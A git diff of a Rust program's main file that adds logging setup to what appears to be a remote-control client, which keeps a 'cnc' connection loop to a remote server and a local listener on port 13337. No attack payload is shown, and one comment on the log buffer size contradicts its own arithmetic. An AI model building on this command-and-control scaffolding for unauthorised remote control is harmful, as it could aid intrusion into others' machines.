@@ -1,20 +1,17 @@
-use std::alloc::System;
-
 #[macro_use]
 extern crate enum_primitive_derive;
 extern crate num_traits;
 
-// Use system allocator as global allocator
-// This is done in order to not use JEMALLOC which takes up a lot of space in the binary
-#[global_allocator]
-static GLOBAL_ALLOCATOR: System = System;
-
 use crate::communication::server::handle_client;
 use std::net::TcpStream;
 use std::{thread, time};
+use crate::logging::core::{setup_logging, LoggingConfiguration, print_logs};
+use std::process::exit;
+use log::{info};
 
 pub mod communication;
 pub mod actions;
+pub mod logging;
 
 const RETRY_INTERVAL_SECONDS: u64 = 5;
 const SERVER_LISTENING_PORT: u16 = 13337;
@@ -59,7 +56,26 @@ fn run_cnc_connection_loop() {
     }
 }
 
+fn init_logging() {
+    unsafe {
+        // This function is unsafe as it mutates the global logging state, initializing it.
+        // We are calling it before using any logging functionality (which would've been pointless before initialization).
+        // Also, we are calling it before creating any threads.
+        // Therefore, this is a safe operation.
+        setup_logging(LoggingConfiguration {
+            to_stdout: true,
+            to_memory: true,
+            // Allow max 10,000 characters to be written to log memory
+            // This is 4096 * 4 = 16kb.
+            max_memory_log_size_bytes: 4096 * std::mem::size_of::<char>(),
+            level: log::LevelFilter::Debug
+        });
+    }
+}
+
 fn main() {
+    init_logging();
+
     // Support several ways of communication - cnc remote server + local server listening on port.
     let server_handler = thread::spawn(run_server_loop);
     let cnc_connect = thread::spawn(run_cnc_connection_loop);
